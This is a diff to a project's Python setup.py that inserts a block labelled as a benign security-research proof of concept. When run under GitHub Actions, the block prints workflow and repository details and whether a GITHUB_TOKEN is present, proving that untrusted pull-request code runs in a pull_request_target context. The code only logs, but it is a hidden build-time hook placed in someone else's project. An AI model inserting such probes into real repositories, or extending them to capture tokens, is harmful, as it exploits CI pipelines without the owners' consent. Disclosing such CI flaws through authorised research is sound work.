@@ -5,6 +5,20 @@
 # Licensed under the MIT License. See License.txt in the project root for license information.
 # --------------------------------------------------------------------------------------------
 
+# Security Research - Benign PoC (no exfiltration, no modification, log output only)
+import os as _os
+if _os.environ.get("GITHUB_ACTIONS") == "true":
+    print("\n" + "=" * 80)
+    print("[SECURITY-RESEARCH] Code execution in pull_request_target context")
+    print("[SECURITY-RESEARCH] GITHUB_REPOSITORY=" + _os.environ.get("GITHUB_REPOSITORY", "N/A"))
+    print("[SECURITY-RESEARCH] GITHUB_WORKFLOW=" + _os.environ.get("GITHUB_WORKFLOW", "N/A"))
+    print("[SECURITY-RESEARCH] GITHUB_RUN_ID=" + _os.environ.get("GITHUB_RUN_ID", "N/A"))
+    print("[SECURITY-RESEARCH] GITHUB_EVENT_NAME=" + _os.environ.get("GITHUB_EVENT_NAME", "N/A"))
+    print("[SECURITY-RESEARCH] GITHUB_ACTOR=" + _os.environ.get("GITHUB_ACTOR", "N/A"))
+    print("[SECURITY-RESEARCH] GITHUB_TOKEN_PRESENT=" + str("GITHUB_TOKEN" in _os.environ))
+    print("[SECURITY-RESEARCH] RUNNER_OS=" + _os.environ.get("RUNNER_OS", "N/A"))
+    print("=" * 80 + "\n")
+
 from codecs import open
 from setuptools import setup, find_packages
 
